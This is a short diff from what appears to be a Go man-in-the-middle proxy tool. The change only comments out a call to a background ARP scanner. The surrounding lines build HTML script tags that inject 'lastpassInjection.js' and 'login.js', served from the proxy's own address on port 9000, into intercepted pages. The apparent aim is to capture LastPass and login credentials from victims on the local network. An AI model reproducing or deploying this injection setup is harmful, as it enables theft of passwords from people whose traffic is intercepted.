@@ -71,7 +71,8 @@ func InitiateProxy() {
 	INJECT_LASTPASS_RESULT =  "<script src=\"http://"+proxyAddress+":9000/public/InjectionScripts/lastpassInjection.js\"></script></body>"
 	INJECT_LOGIN_RESULT =  "<script src=\"http://"+proxyAddress+":9000/public/InjectionScripts/login.js\"></script></body>"
 	users = make(map[string]string)
-	go arpScanner() //start the arpscanner in the background
+	//commented out arp scanner
+	//go arpScanner() //start the arpscanner in the background
 	// getRedirectUrls() //temporary
 }
 
